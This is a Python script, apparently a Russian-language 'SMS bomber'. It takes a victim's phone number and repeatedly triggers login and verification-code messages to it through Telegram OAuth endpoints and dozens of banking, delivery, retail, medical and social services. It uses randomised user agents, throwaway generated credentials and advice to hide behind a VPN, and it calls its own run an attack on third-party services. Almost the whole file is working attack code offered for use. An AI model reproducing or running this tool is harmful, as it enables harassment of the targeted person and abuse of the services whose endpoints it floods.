# DEVELOPED BY MYATTNI
# t.me/myattnidev
# github.com/MyattniOps/Bomber

import os
os.system('pip install pystyle colorama shutil socket termcolor pyfiglet fake_useragent requests datetime sys argparse random')
from pystyle import Colors, Box, Write, Center, Colorate
import shutil
import datetime
import socket
import argparse
import sys
import pyfiglet
import fake_useragent
from fake_useragent import UserAgent
import requests
import random


os.system('cls' if os.name == 'nt' else 'clear')

banner = """

                                                               
                                                        *@@@*   *@@* *@@@@**@@@@*   *@@@**@@@@**@@@@* *@@@*   
                                                          @@@m  m@     @@    *@@     m@    @@    @@   m@*     
                                                           *@@m@*      @@     @@m   m@     @@    @@ m@*       
                                                             @@@       @@      @@m  @*     @@    @@@@@m       
                                                           m@**@@m     @!      *!@ !*      @!    !@  @@!      
                                                           @   *@@m    @!       !@@m       @!    !@   *!!m    
                                                           !!   !!!    !!       !! !*      !!    !!    !:!    
                                                          !!    *!!!   :!       !!::       :!    !!     :!!!  
                                                        :  : :    : :::!: :       :       :!: : : : :      : : 
                                                      
                                                      

                                                               
                                                               


                    [!] OWNER: @myattni
                    [!] Dev: @Myattni
                    [!] Channel: @myattnidev
"""


colored_banner = Colorate.Diagonal(Colors.black_to_white, banner)
print(colored_banner)
Write.Print("\n[>] Рекомендация: Включите VPN/Proxy\n", Colors.light_gray)
Write.Print("Отменить отправку кодами можно Ctrl + C\n", Colors.light_gray)


Write.Print("Введите номер [+79999999999]: ", Colors.white, end='')
number = input()
_phone = number.strip().replace('+', '').replace(' ', '')


if _phone.startswith('8'):
    _phone = '7' + _phone[1:]
elif _phone.startswith('9'):
    _phone = '7' + _phone

count = 0
ua = UserAgent()  

try:
    for _ in range(282):
        headers = {'user-agent': ua.random}

        # Список запросов к Telegram API
        telegram_endpoints = [
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'https://oauth.telegram.org/auth?bot_id=547043436&origin=https%3A%2F%2startpack.ru&embed=1&request_access=write&return_to=https%3A%2F%2startpack.ru%2Fwidgets%2Flogin',
            'https://my.telegram.org/auth/send_password'
        ]

        for endpoint in telegram_endpoints:
            try:
                if 'my.telegram.org' in endpoint:
                    requests.post(endpoint, headers=headers, data={'phone': _phone})
                else:
                    requests.post(endpoint, headers=headers, data={'phone': _phone})
            except Exception as e:
                Write.Print(f'[-] Ошибка при отправке на {endpoint}: {str(e)}\n', Colors.dark_gray)

        count += 1
        Write.Print(f'[+] Цикл {count}/282 выполнен. Коды отправлены.\n', Colors.light_gray)
        
except Exception as e:
    Write.Print(f'[X] Критическая ошибка: {e}\n', Colors.white)

# Генерация случайных данных
_name = ''.join(random.choices('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM', k=12))
password = _name + random.choice('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')
username = _name + random.choice('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')
iteration = _name + random.choice('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')
_email = f"{_name}{iteration}@gmail.com"

# Форматирование номера
_phone9 = _phone[1:]
_phoneAresBank = f'+({_phone[1:4]}){_phone[4:7]}-{_phone[7:9]}-{_phone[9:11]}'
_phone9dostavista = f'+{_phone9[:3]}-{_phone9[3:6]}-{_phone9[6:8]}-{_phone9[8:10]}'
_phoneOstin = f'+{_phone[0]}({_phone[1:4]}){_phone[4:7]}-{_phone[7:9]}-{_phone[9:11]}'
_phonePizzahut = f'+{_phone[0]} ({_phone[1:4]}) {_phone[4:7]} {_phone[7:9]} {_phone[9:11]}'
_phoneGorzdrav = f'{_phone[1:4]}) {_phone[4:7]}-{_phone[7:9]}-{_phone[9:11]}'

# Список сервисов с исправленным синтаксисом
services = [
    # Сервисы такси и доставки
    ('https://p.grabtaxi.com/api/passenger/v2/profiles/register', 
     {'data': {'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, 
      'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}}),
     
    ('https://moscow.rutaxi.ru/ajax_keycode.html', 
     {'data': {'l': _phone9}}),
     
    ('https://belkacar.ru/get-confirmation-code', 
     {'data': {'phone': _phone}}),
     
    ('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', 
     {'data': {'phone_number': _phone}}),
     
    ('https://app.karusel.ru/api/v1/phone/', 
     {'data': {'phone': _phone}}),
     
    ('https://api.tinkoff.ru/v1/sign_up', 
     {'data': {'phone': '+' + _phone}}),
     
    ('https://eda.yandex/api/v1/user/request_authentication_code', 
     {'json': {'phone_number': '+' + _phone}, 'headers': {}}),
     
    ('https://www.delivery-club.ru/ajax/user_otp', 
     {'data': {'phone': _phone}}),
     
    ('https://qlean.ru/clients-api/v2/sms_codes/auth/request_code', 
     {'json': {'phone': _phone}, 'headers': {}}),
     
    ('https://api.delitime.ru/api/v2/signup', 
     {'data': {'SignupForm[username]': _phone, 'SignupForm[device_type]': '3'}}),
     
    # Финансовые сервисы
    ('https://api.sunlight.net/v3/customers/authorization/', 
     {'data': {'phone': _phone}}),
     
    ('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', 
     {'json': {'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'}, 'headers': {}}),
     
    ('https://online.sbis.ru/reg/service/', 
     {'json': {'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика', 'params': {'phone': _phone}, 'id': '1'}, 'headers': {}}),
     
    ('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', 
     {'json': {'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1', 'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': True, 'isDSA': False, 'personalDataProcessingAgreement': True, 'bKIRequestAgreement': 'null', 'promotionAgreement': True}, 'headers': {}}),
     
    ('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', 
     {'data': {'phone': _phone}}),
     
    # Розничные сети и магазины
    ('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', 
     {'params': {'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false', 'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''}, 
      'data': {'phone': _phone, 'g-recaptcha-response': '', 'recaptcha': 'on'}}),
     
    ('https://newnext.ru/graphql', 
     {'json': {'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}}, 'query': 'mutation registration($client: ClientInput!) {\n  registration(client: $client) {\n    token\n    __typename\n  }\n}\n'}, 'headers': {}}),
     
    ('https://pizzahut.ru/account/password-reset', 
     {'data': {'reset_by': 'pass-recovery', 'action_id': _phonePizzahut, 'phone': _phone, '_token': '*'}}),
     
    ('https://www.citilink.ru/registration/confirm/phone/+' + _phone, 
     {}),
     
    ('https://www.icq.com/smsreg/requestPhoneValidation.php', 
     {'data': {'msisdn': _phone, 'locale': 'en', 'countryCode': 'ru', 'version': '1', 'k': 'ic1rtwz1s1Hj1O0r', 'r': '46763'}}),
     
    ('https://lenta.com/api/v1/authentication/requestValidationCode', 
     {'json': {'phone': '+' + _phone}, 'headers': {}}),
     
    # Медицинские сервисы
    ('https://lk.invitro.ru/lk2/lka/patient/refreshCode', 
     {'data': {'phone': _phone}}),
     
    ('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', 
     {'data': {'password': password, 'application': 'lkp', 'login': '+' + _phone}}),
     
    ('https://ube.pmsm.org.ru/esb/iqos-phone/validate', 
     {'json': {'phone': _phone}, 'headers': {}}),
     
    ('https://gorzdrav.org/login/register/sms/send', 
     {'data': {'phone': _phoneGorzdrav}}),
     
    # Социальные сети и знакомства
    ('https://youla.ru/web-api/auth/request_code', 
     {'data': {'phone': _phone}}),
     
    ('https://passport.twitch.tv/register?trusted_request=true', 
     {'json': {'birthday': {'day': 11, 'month': 11, 'year': 1999}, 'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True, 'password': password, 'phone_number': _phone, 'username': username}, 'headers': {}}),
     
    ('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', 
     {'data': {'st.r.phone': '+' + _phone}}),
     
    ('https://findclone.ru/register', 
     {'params': {'phone': '+' + _phone}, 'headers': {}}),
     
    # Телеком и интернет-провайдеры
    ('https://api.mtstv.ru/v1/users', 
     {'json': {'msisdn': _phone}, 'headers': {}}),
     
    ('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', 
     {'data': {'phone': _phone}}),
     
    ('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', 
     {'data': {'name': _name, 'phone': _phone, 'promo': 'yellowforma'}}),
     
    ('https://cloud.mail.ru/api/v2/notify/applink', 
     {'json': {'phone': '+' + _phone, 'api': 2, 'email': 'email', 'x-email': 'x-email'}, 'headers': {}}),
     
    # Развлекательные сервисы
    ('https://api.ivi.ru/mobileapi/user/register/phone/v6', 
     {'data': {'phone': _phone}}),
     
    ('https://www.oyorooms.com/api/pwa/generateotp', 
     {'params': {'phone': _phone9, 'country_code': '+7', 'nod': '4', 'locale': 'en'}, 'headers': {}}),
     
    ('https://rutube.ru/api/accounts/sendpass/phone', 
     {'data': {'phone': '+' + _phone}}),
     
    ('https://api.carsmile.com/', 
     {'json': {'operationName': 'enterPhone', 'variables': {'phone': _phone}, 'query': 'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'}, 'headers': {}}),
     
    ('https://plink.tech/register/', 
     {'json': {'phone': _phone}, 'headers': {}}),
     
    # Работа и карьера
    ('https://www.rabota.ru/remind', 
     {'data': {'credential': _phone}}),
     
    ('https://api.wowworks.ru/v2/site/send-code', 
     {'json': {'phone': _phone, 'type': 2}, 'headers': {}}),
     
    # Другие популярные сервисы
    ('https://guru.taxi/api/v1/driver/session/verify', 
     {'json': {'code': '1', 'number': _phone}, 'headers': {}}),
     
    ('https://terra-1.indriverapp.com/api/authorization?locale=ru', 
     {'data': {'mode': 'request', 'phone': '+' + _phone, 'phone_permission': 'unknown', 'stream_id': 0, 'v': 3, 'appversion': '3.20.6', 'osversion': 'unknown', 'devicemodel': 'unknown'}}),
     
    ('https://smsgorod.ru/sendsms.php', 
     {'data': {'number': _phone}}),
     
    ('https://cabinet.wi-fi.ru/api/auth/by-sms', 
     {'data': {'msisdn': _phone}, 'headers': {'App-ID': 'cabinet'}}),
     
    ('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', 
     {'json': {'phone': '+' + _phone}, 'headers': {}}),
     
    ('https://ostin.com/ru/ru/secured/myaccount/forgotpassword/send', 
     {'data': {'phone': _phoneOstin}}),
     
    ('https://www.aresbank.ru/api/sendCode', 
     {'json': {'phone': _phoneAresBank}, 'headers': {}}),
     
    ('https://dostavista.ru/backend/send-verification-code', 
     {'data': {'phone': _phone9dostavista}}),
     
    ('https://www.megafon.ru/api/lk/login/check-phone', 
     {'json': {'msisdn': _phone}, 'headers': {}}),
     
    ('https://api.delivery-club.ru/api/v1/user/request_confirmation_code', 
     {'json': {'phone': '+' + _phone}, 'headers': {}}),
     
    ('https://sushiwok.ru/ru/auth/send-code/', 
     {'data': {'phone': _phone}, 'headers': {}}),
     
    ('https://www.sportmaster.ua/ua/user/restore-password/by-sms', 
     {'data': {'phone': _phone}, 'headers': {}}),
     
    ('https://www.moyo.ua/identity/registration', 
     {'data': {'phone': _phone}, 'headers': {}}),
     
    ('https://my.rozetka.com.ua/signin/service/restore/confirm/send', 
     {'data': {'login': _phone}, 'headers': {}}),
     
    ('https://www.eldorado.ru/ajax/register/request/sms', 
     {'data': {'phone': _phone}, 'headers': {}}),
     
    ('https://www.dns-shop.ru/auth/auth/send-sms-confirmation', 
     {'data': {'phone': _phone}, 'headers': {}}),
     
    ('https://www.citilink.ru/ajax/user/register/phone/sms', 
     {'data': {'phone': _phone}, 'headers': {}}),
     
    ('https://www.avito.ru/send_code', 
     {'data': {'phone': _phone}, 'headers': {}}),
     
    ('https://www.wildberries.ru/lk/sendcode', 
     {'data': {'phone': _phone}, 'headers': {}}),
     
    ('https://www.ozon.ru/api/site/sendSmsCode', 
     {'data': {'phone': _phone}, 'headers': {}}),
     
    ('https://www.lamoda.ru/api/v1/auth/send-code', 
     {'json': {'phone': _phone}, 'headers': {}}),
     
    ('https://www.gloria-jeans.ru/api/auth/send-sms', 
     {'json': {'phone': _phone}, 'headers': {}}),
]

Write.Print('\n[!] Начинаем атаку на сторонние сервисы...\n', Colors.light_gray)

for service in services:
    url, params = service
    try:
        # Определяем тип запроса по наличию параметров
        if 'json' in params:
            response = requests.post(url, json=params['json'], headers=params.get('headers', {}))
        elif 'data' in params:
            response = requests.post(url, data=params['data'], headers=params.get('headers', {}))
        elif 'params' in params:
            response = requests.get(url, params=params['params'], headers=params.get('headers', {}))
        else:
            response = requests.get(url, headers=params.get('headers', {}))
        
        if response.status_code == 200:
            Write.Print(f'[+] {url} - успешно!\n', Colors.light_gray)
        else:
            Write.Print(f'[-] {url} - ошибка {response.status_code}\n', Colors.dark_gray)
    except Exception as e:
        Write.Print(f'[X] Ошибка при отправке на {url}: {str(e)}\n', Colors.white)

Write.Print('\n[!] Атака завершена!\n', Colors.light_gray)
